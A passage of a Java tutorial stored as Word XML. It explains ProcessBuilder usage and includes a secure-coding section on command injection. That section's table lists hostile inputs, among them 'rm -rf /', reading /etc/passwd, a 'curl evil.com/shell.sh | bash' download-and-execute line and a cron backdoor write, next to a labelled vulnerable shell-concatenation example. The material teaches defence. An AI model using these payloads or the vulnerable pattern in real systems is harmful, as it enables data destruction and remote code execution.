    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9.7 Manual Pipeline (Pre-Java 9 Approach)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>For reference — shows why `startPipeline()` was a welcome addition:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Manual pipe: ls | grep java (pre-Java 9 style)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process ls = new ProcessBuilder("ls").start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process grep = new ProcessBuilder("grep", "java").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Pipe ls stdout → grep stdin in a background thread</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread pipeThread = new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ls.getInputStream().transferTo(grep.getOutputStream());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>grep.getOutputStream().close(); // signal EOF to grep</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>e.printStackTrace();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pipeThread.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>String result = new String(grep.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ls.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>grep.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pipeThread.join();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(result);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. Security — Command Injection Risk</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 What Is Command Injection?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Command injection occurs when **user-supplied data** is incorporated into an OS command without sanitization, allowing an attacker to execute arbitrary commands on the server.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>This is the **OS-level equivalent of SQL injection**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 The Vulnerable Pattern</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>The problem arises when you invoke a **shell** (e.g., `/bin/sh -c`) and embed unsanitized user input into the command string:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// VULNERABLE — DO NOT DO THIS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public void searchFiles(String userFilename) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Attacker supplies: "irrelevant; rm -rf /"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String command = "find /uploads -name " + userFilename;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// The shell splits and executes: find /uploads -name irrelevant ; rm -rf /</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// The rm -rf / executes as a separate command!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 Attack Examples</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| User Input | Shell Executes |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `file; rm -rf /` | `find . -name file` **and** `rm -rf /` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `$(cat /etc/passwd)` | `find . -name [contents of /etc/passwd]` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `\`whoami\`` | Command substitution — executes `whoami` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `file &amp;&amp; curl evil.com/shell.sh \| bash` | Downloads and executes remote script |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `'*'` | Glob expansion deletes everything |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `file &gt; /etc/cron.d/backdoor` | Creates a cron backdoor |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.4 The Safe Pattern — Pass Arguments as Separate List Elements</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>When you **don't use a shell** and pass each argument as a separate list element, shell metacharacters (`; | &gt; $ &amp; ( ) \` `) are treated as **literal characters**, not interpreted by any shell.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// SAFE — user input is just a string argument, not shell-interpreted</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public void searchFiles(String userFilename) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("find", "/uploads", "-name", userFilename);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Even if userFilename = "irrelevant; rm -rf /"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// It is passed as a single argument: find /uploads -name "irrelevant; rm -rf /"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// find will just look for a file with semicolons in the name — harmless</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.5 When You MUST Use a Shell — Whitelist Validation</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>If your use case genuinely requires shell features, **whitelist** the input before using it:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// If you must use a shell, validate input strictly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>private static final Pattern SAFE_FILENAME = Pattern.compile("[a-zA-Z0-9._\\-]{1,255}");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public void searchFiles(String userFilename) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// VALIDATE first — reject anything not matching safe pattern</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (!SAFE_FILENAME.matcher(userFilename).matches()) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throw new IllegalArgumentException("Invalid filename: " + userFilename);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Now it's safe to use in a shell command (though the list-based approach is still preferred)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"find /uploads -name " + userFilename + " -type f");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.6 The Core Rule</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>**Never concatenate user input into a shell command string.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Always pass user data as a **separate argument** in the `ProcessBuilder` list.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>If you must use `/bin/sh -c`, **whitelist-validate** the input first.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// ❌ DANGEROUS — never do this</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("/bin/sh", "-c", "convert " + userInput + " output.jpg");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// ✅ SAFE — each argument is isolated</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("convert", userInput, "output.jpg");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// userInput is just a filename argument — no shell interpretation</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.7 Additional Security Hardening</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public ProcessBuilder hardened(String... command) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder(command);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// 1. Run in a restricted working directory — not /</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.directory(new File("/tmp/sandbox"));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// 2. Sanitize the environment — don't inherit potentially dangerous env vars</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Map&lt;String, String&gt; env = pb.environment();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.clear();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("PATH", "/usr/bin:/bin");     // minimal PATH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("HOME", "/tmp/sandbox");      // restricted home</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Do NOT pass DATABASE_PASSWORD, AWS_SECRET_KEY, etc.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// 3. Merge stderr so you can log it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>return pb;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.8 Path Injection — Validate Executable Paths</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// DANGEROUS — user could supply "../../bin/bash" as tool name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public void runTool(String toolName) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("/opt/tools/" + toolName).start(); // path traversal!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// SAFE — whitelist allowed tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>private static final Set&lt;String&gt; ALLOWED_TOOLS = Set.of("tool-a", "tool-b", "analyzer");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public void runTool(String toolName) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (!ALLOWED_TOOLS.contains(toolName)) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throw new SecurityException("Tool not permitted: " + toolName);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("/opt/tools/" + toolName).start(); // now safe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.9 Security Summary</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Risk | Mitigation |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Command injection via shell | Use list-based args, no `/bin/sh -c` with user input |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Argument injection | Pass user data as separate list elements |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Path traversal | Validate executable paths; use whitelists |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Environment leakage | Clear `env` map, set minimal safe values |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Privilege escalation | Run child in restricted directory, drop privileges |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Unbounded execution | Use `waitFor(timeout, unit)` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Resource exhaustion | Limit concurrent child processes |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Additional Topics</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.1 Cross-Platform Command Differences</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>A common source of bugs is writing process commands that only work on one OS:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public class CrossPlatform {</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public static ProcessBuilder listDirectory(String path) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String os = System.getProperty("os.name").toLowerCase();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if (os.contains("win")) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return new ProcessBuilder("cmd.exe", "/c", "dir", path);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} else {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return new ProcessBuilder("ls", "-la", path);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public static ProcessBuilder runScript(String scriptPath) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String os = System.getProperty("os.name").toLowerCase();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if (os.contains("win")) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return new ProcessBuilder("cmd.exe", "/c", scriptPath);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} else {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return new ProcessBuilder("/bin/sh", scriptPath);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.2 Detecting the OS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>String os = System.getProperty("os.name").toLowerCase();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>boolean isWindows = os.contains("win");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>boolean isMac     = os.contains("mac");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>boolean isLinux   = os.contains("nux") || os.contains("nix");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.3 Inheriting Environment Selectively</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Start with JVM's environment, then selectively override</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("myapp");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Map&lt;String, String&gt; env = pb.environment(); // starts as copy of current env</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Override specific variables</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("LOG_LEVEL", "DEBUG");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.remove("DISPLAY"); // remove headless env vars</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Now the child has all of Java's env plus your overrides</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.4 Reading Large Output — `transferTo()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>For large process outputs, avoid `readAllBytes()` (loads everything into memory):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("cat", "huge-file.log");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Stream output to a file without loading into memory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (InputStream in = p.getInputStream();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OutputStream out = new FileOutputStream("copy.log")) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>in.transferTo(out); // Java 9+ — efficiently streams without large buffer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.5 Checking if a Command Exists</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public static boolean commandExists(String command) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = System.getProperty("os.name").toLowerCase().contains("win")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>? new ProcessBuilder("where", command)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>: new ProcessBuilder("which", command);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.getInputStream().transferTo(OutputStream.nullOutputStream()); // drain</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return p.waitFor() == 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (Exception e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Usage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(commandExists("git"));    // true/false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(commandExists("docker")); // true/false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.6 Reusing `ProcessBuilder` — `start()` is Reusable</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>You can call `start()` multiple times on the same `ProcessBuilder`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("date");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Start multiple instances</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>for (int i = 0; i &lt; 3; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(new String(p.getInputStream().readAllBytes()).trim());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread.sleep(1000);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.7 Process Groups and Children on Unix</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>On Unix systems, child processes may themselves spawn further children. When you call `destroy()` on the parent, the grandchildren may **not** be killed. To kill an entire process tree:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Java 9+ — kill a process and all its descendants</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Kill entire tree</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.toHandle().descendants().forEach(ProcessHandle::destroyForcibly);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.8 `CompletableFuture` Composition with Processes</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Run two processes in parallel, combine results</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("hostname").start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String out = new String(p.getInputStream().readAllBytes()).trim();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return out;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (Exception e) { throw new RuntimeException(e); }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>CompletableFuture&lt;String&gt; future2 = CompletableFuture.supplyAsync(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("whoami").start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String out = new String(p.getInputStream().readAllBytes()).trim();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return out;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (Exception e) { throw new RuntimeException(e); }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>future1.thenCombine(future2, (host, user) -&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String.format("Running as %s on %s", user, host))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.thenAccept(System.out::println)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.join();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.9 `Runtime.exec()` — Legacy API (Avoid)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>For historical awareness — the old way:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// OLD — Runtime.exec() — avoid this</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = Runtime.getRuntime().exec("ls -la /tmp");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// PROBLEMS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// 1. Splits by spaces — breaks on filenames with spaces</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// 2. No stream handling convenience</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// 3. No working directory / environment configuration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// 4. Deprecated mental model</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Use ProcessBuilder instead — always</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11.10 Complete Utility Class</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>import java.io.*;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>import java.lang.*;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
